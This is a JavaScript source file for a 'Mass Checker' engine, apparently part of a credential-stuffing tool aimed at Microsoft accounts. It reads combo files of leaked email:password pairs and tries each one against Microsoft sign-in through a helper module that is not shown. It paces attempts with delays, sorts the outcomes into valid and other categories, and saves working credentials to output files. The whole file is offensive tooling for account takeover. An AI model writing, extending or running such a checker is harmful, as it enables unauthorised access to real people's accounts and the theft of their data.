const MicrosoftAuth = require('../lib/microsoft-auth');
const FileHandler = require('../utils/file-handler');
const Display = require('../utils/display');
const config = require('../config/app-config');

/**
 * Mass Checker Core Engine
 * Main processing engine for mass email verification
 * @author Dsigala
 * @version 1.0.0
 */
class MassChecker {
    constructor() {
        this.microsoftAuth = new MicrosoftAuth();
        this.stats = {
            valid: 0,
            invalid: 0,
            custom: 0,
            nfa: 0,
            retry: 0
        };
        this.results = [];
    }

    /**
     * Sleep/delay function
     * @param {number} ms - Milliseconds to wait
     */
    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Process a single email/password combination
     * @param {string} email - Email address
     * @param {string} password - Password
     * @returns {Object} Result object
     */
    async processSingle(email, password) {
        try {
            const [status, canary] = await this.microsoftAuth.verify(email, password);
            
            const result = {
                email,
                password,
                status,
                canary: canary || null,
                timestamp: new Date().toISOString()
            };

            // Update statistics
            this.stats[status === 'ok' ? 'valid' : 
                     status === 'fail' ? 'invalid' : status]++;

            // Store result
            this.results.push(result);

            // Display result if noteworthy
            if (['ok', 'custom', 'nfa'].includes(status)) {
                Display.showResult(status, email, password);
            }

            return result;

        } catch (error) {
            this.stats.retry++;
            const result = {
                email,
                password,
                status: 'retry',
                error: error.message,
                timestamp: new Date().toISOString()
            };
            this.results.push(result);
            return result;
        }
    }

    /**
     * Process mass checking
     * @param {string} comboPath - Path to combo file
     * @param {Object} options - Processing options
     */
    async processMass(comboPath, options = {}) {
        const outputDir = options.outputDir || config.defaults.outputDir;

        Display.showInfo('Reading combo file...');
        const combos = FileHandler.parseComboFile(comboPath);
        
        if (combos.length === 0) {
            Display.showError('No valid combos found in file!');
            return;
        }

        Display.showInfo(`Total combos to check: ${combos.length}`);
        Display.showInfo('Starting mass check with direct connection...\n');

        // Process each combo
        for (let i = 0; i < combos.length; i++) {
            const { email, password } = combos[i];
            
            await this.processSingle(email, password);
            
            // Show progress
            Display.showProgress(i + 1, combos.length, this.stats);

            // Rate limiting
            await this.delay(config.defaults.delay);
        }

        // Show final results
        Display.showFinalStats(this.stats, combos.length);

        // Save results
        this.saveResults(outputDir);
    }

    /**
     * Save results to files
     * @param {string} outputDir - Output directory
     */
    saveResults(outputDir) {
        Display.showInfo('\nSaving results...');

        // Create output directory
        FileHandler.createDir(outputDir);

        // Save valid results to main file
        FileHandler.saveResults(
            this.results, 
            config.defaults.validFile, 
            'ok'
        );

        // Save categorized results
        FileHandler.saveCategorizedResults(this.results, outputDir);

        Display.showSuccess('All results saved successfully!');
    }

    /**
     * Get current statistics
     * @returns {Object} Current stats
     */
    getStats() {
        return { ...this.stats };
    }

    /**
     * Get all results
     * @returns {Array} All results
     */
    getResults() {
        return [...this.results];
    }

    /**
     * Reset checker state
     */
    reset() {
        this.stats = {
            valid: 0,
            invalid: 0,
            custom: 0,
            nfa: 0,
            retry: 0
        };
        this.results = [];
    }
}

module.exports = MassChecker;
